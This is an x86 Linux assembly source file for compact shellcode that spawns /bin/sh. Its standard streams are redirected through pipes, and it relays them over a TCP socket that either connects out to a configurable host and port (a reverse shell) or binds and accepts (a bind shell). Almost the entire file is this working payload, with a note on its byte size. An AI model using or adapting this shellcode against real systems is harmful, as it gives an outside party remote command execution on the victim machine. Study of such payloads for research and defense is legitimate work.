;
;  Copyright © 2018 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;  
; -----------------------------------------------
; Synchronous shell for Linux/x86
;
; 314 bytes for connect
; 352 bytes for bind
;
; -----------------------------------------------

      %include "include.inc"

      %ifndef BIN
        global start
        global _start
      %endif     
           
      %define PORT 1234
      %define HOST 0x0100007f
    
start:    
_start:
      pushad
      ; allocate 64 bytes of stack
      xor    ecx, ecx
      mul    ecx
      mov    cl, ds_tbl_size
      sub    esp, ecx
      mov    ebp, esp
      ; create pipes for redirection of stdin/stdout/stderr
      mov    edi, ebp
      mov    cl, 2
c_pipe:      
      ; pipe(in);
      ; pipe(out);
      mov    al, SYS_pipe
      mov    ebx, edi        ; ebx = p_in or p_out      
      int    0x80      
      scasd                  ; edi += 4
      scasd                  ; edi += 4
      loop   c_pipe    
      
      ; fork process
      ; pid = fork();
      mov    al, SYS_fork
      int    0x80    
      stosd                  ; save pid
      test   eax, eax        ; already forked?
      jnz    opn_con         ; open connection
      
      ; in this order..
      ;
      ; dup2 (out[1], STDERR_FILENO)      
      ; dup2 (out[1], STDOUT_FILENO)
      ; dup2 (in[0],  STDIN_FILENO )   
      mov    cl, STDERR_FILENO + 1
      mov    ebx, [ebp+@out1]     ; ebx = out[1]
c_dup:
      mov    al, SYS_dup2
      dec    ecx             ; becomes STDOUT_FILENO, then STDIN_FILENO      
      cmovz  ebx, [ebp+@in0] ; replace stdin with in[0]      
      int    0x80
      jnz    c_dup  
  
      ; close pipe handles in this order..
      ;
      ; close(in[0]);
      ; close(in[1]);
      ; close(out[0]);
      ; close(out[1]);
      mov    esi, ebp          ; esi = p_in and p_out
      mov    cl, 4             ; close 4 handles     
cls_pipe:
      lodsd                    ; eax = pipes[i]
      xchg   eax, ebx      
      push   SYS_close
      pop    eax 
      int    0x80
      loop   cls_pipe      
      
      ; execve("/bin//sh", 0, 0);
      mov    al, SYS_execve
      push   ecx               ; push null terminator
      push   '//sh'
      push   '/bin'
      mov    ebx, esp          ; ebx = "/bin//sh", 0
      int    0x80
opn_con:    
      ; close(in[0]);
      push   SYS_close
      pop    eax
      mov    ebx, [ebp+@in0]    
      int    0x80    

      ; close(out[1]);
      mov    al, SYS_close     
      mov    ebx, [ebp+@out1]    
      int    0x80   
      
      ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);     
      mov    al, SYS_socketcall
      push   SYS_SOCKET        ; ebx = 1
      pop    ebx
      push   edx               ; protocol = IPPROTO_IP
      push   ebx               ; type     = SOCK_STREAM
      push   AF_INET
      mov    ecx, esp          ; ecx      = &args      
      int    0x80 
      add    esp, 3*4          ; release args to socket
      stosd                    ; save socket
      
      %ifdef BIND
        push edx               ; sa.sin_addr=INADDR_ANY
      %else
        push HOST              ; sa.sin_addr=127.0.0.1
      %endif
      push   ((htons(PORT) << 16) | AF_INET) & 0xFFFFFFFF
                               ; sa.sin_family=AF_INET
      mov    ecx, esp          ; ecx = &sa
      
      push   16                ; sizeof(sa)      
      push   ecx               ; &sa
      push   eax               ; s
      mov    ecx, esp          ; &args       
%ifdef BIND  
      push   SYS_socketcall
      pop    eax
      ; bind (s, &sa, sizeof(sa));
      inc    ebx                ; ebx = 2, SYS_BIND     
      int    0x80
      add    esp, 5*4           ; release sa and args to connect
      test   eax, eax
      jnz    cls_sck
      
      sub    esp, 5*4
      mov    [ecx+4], eax       ; clear sa from args

      ; listen (s, 0);
      mov    al, SYS_socketcall
      mov    bl, SYS_LISTEN     ; ebx = 4
      int    0x80

      ; accept (s, 0, 0);
      mov    al, SYS_socketcall
      inc    ebx                ; ebx = 5, SYS_ACCEPT
      int    0x80
      add    esp, 5*4           ; release sa and args to connect
      test   eax, eax
      jl     cls_sck
      
      xchg   dword[ebp+@s], eax ; swap with s
      stosd                     ; save as s2
%else
      ; connect (s, &sa, sizeof(sa)); 
      push   SYS_socketcall
      pop    eax
      mov    bl, SYS_CONNECT    ; ebx = 3
      int    0x80      
      add    esp, 5*4           ; release sa and args to connect
      test   eax, eax
      jl     cls_sck
%endif
      ; efd = epoll_create1(0);
      mov    al, SYS_epoll_create1 & 0xFF
      mov    ah, SYS_epoll_create1 >> 8
      xor    ebx, ebx           ; sets CF=0
      int    0x80
      stosd                     ; save efd
      
      ; add 2 descriptors to monitor stdout and socket
      xchg   eax, ebx           ; ebx = efd
      mov    edx, [ebp+@s]       
poll_init:
      ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts);
      mov    esi, edi
      push   EPOLLIN
      pop    eax               ; evts.events = EPOLLIN
      mov    [esi+events], eax
      mov    [esi+data  ], edx ; evts.data.fd = i==0 ? s : out[0]
      mov    al, SYS_epoll_ctl    
      push   EPOLL_CTL_ADD
      pop    ecx
      int    0x80
      mov    edx, [ebp+@out0]  ; do out[0] in 2nd loop      
      cmc                      ; !CF
      jc     poll_init      
      ; now loop until user exits or some other error      
poll_wait:
      ; epoll_wait(efd, &evts, 1, -1);
      mov    esi, -1
      xor    eax, eax          ; eax = SYS_epoll_wait
      mov    ah, 1        
      cdq                      ; edx = 0
      inc    edx               ; edx = 1 event 
      mov    ecx, edi          ; ecx = evts
      mov    ebx, [ebp+@efd]
      int    0x80
      
      ; if (r <= 0) break;
      dec    eax               ; test   eax, eax
      jnz    cls_efd           ; jle    cls_efd
      
      mov    esi, edi
      lodsd                    ; eax = evt.events
      
      ; if (!(evts.events & EPOLLIN)) break;
      dec    eax               ; test   al, EPOLLIN
      jnz    cls_efd

      lodsd                    ; eax = evt.data.fd       
      ; r=(fd==s)?s:out[0];
      ; w=(fd==s)?in[1]:s;
      xchg   ebx, eax          ; ebx = evt.data.fd
      cmp    ebx, [ebp+@s]     ; if socket event
      cmove  eax, [ebp+@in1]   ; write to in[1]
      cmovne eax, [ebp+@s]     ; else read from out[0], write to s
      push   eax
      
      ; read(r, buf, BUFSIZ, 0);
      xor    esi, esi          ; esi = 0
      mov    ecx, edi          ; ecx = buf
      cdq                      ; edx = 0
      mov    dl, BUFSIZ        ; edx = BUFSIZ
      push   SYS_read          ; eax = SYS_read
      pop    eax
      int    0x80
      
      test   eax, eax
      jz     cls_efd
      
      ; encrypt/decrypt buffer
      
      ; write(w, buf, len);
      xchg   eax, edx          ; edx = len
      mov    al, SYS_write
      pop    ebx               ; s or in[1]
      int    0x80
      jmp    poll_wait
cls_efd: 
      ; remove 2 descriptors
      xor    esi, esi          ; esi = NULL
      mov    edx, [ebp+@s]
cls_loop:
      ; epoll_ctl(efd, EPOLL_CTL_DEL, fd, NULL);
      mov    eax, esi
      mov    al, SYS_epoll_ctl
      push   EPOLL_CTL_DEL
      pop    ecx
      mov    ebx, [ebp+@efd]
      int    0x80
            
      ; do out[0] next      
      mov    edx, [ebp+@out0]
      cmc
      jc     cls_loop
           
      ; close(efd);
      mov    al, SYS_close
      int    0x80

      ; shutdown socket
      ; shutdown(s, SHUT_RDWR);
      push   SYS_shutdown & 0xFF
      pop    eax
      mov    ah, 1
      push   SHUT_RDWR
      pop    ecx
      mov    ebx, [ebp+@s]
      int    0x80
cls_sck:      
      ; close(s);
      push   SYS_close
      pop    eax
      int    0x80
%ifdef BIND
      ; close(s2);
      mov    al, SYS_close
      mov    ebx, [ebp+@s2]
      int    0x80
%endif 
      ; terminate /bin/sh
      ; kill(pid, SIGCHLD);
      mov    al, SYS_kill
      push   SIGCHLD
      pop    ecx
      mov    ebx, [ebp+@pid]
      int    0x80

      ; close(in[1]);
      mov    al, SYS_close    
      mov    ebx, [ebp+@in1]
      int    0x80   

      ; close(out[0]);
      mov    al, SYS_close    
      mov    ebx, [ebp+@out0]
      int    0x80   
      
      ; only include exit system call
      ; if compiled as ELF
%ifndef BIN
      ; exit(0);
      mov    al, SYS_exit
      int    0x80
%else
      ; release memory 
      add    esp, ds_tbl_size
      ; restore registers
      popad
      ret
%endif      
